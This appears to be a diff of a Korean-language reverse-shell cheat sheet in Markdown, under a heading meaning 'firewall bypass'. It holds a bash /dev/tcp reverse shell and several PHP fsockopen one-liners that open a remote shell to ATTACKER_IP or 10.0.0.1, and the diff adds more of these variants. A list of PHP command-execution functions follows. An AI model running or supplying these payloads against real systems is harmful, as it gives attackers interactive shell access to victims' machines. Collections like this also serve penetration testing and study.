@@ -53,7 +53,8 @@ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 ```php
 # 방화벽 우회
 php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
-php -r '$sock=fsockopen("ATTACKER_IP",443);exec("bash <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/bash <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 # 기타 함수
 # shell_exec, system, passthru, popen
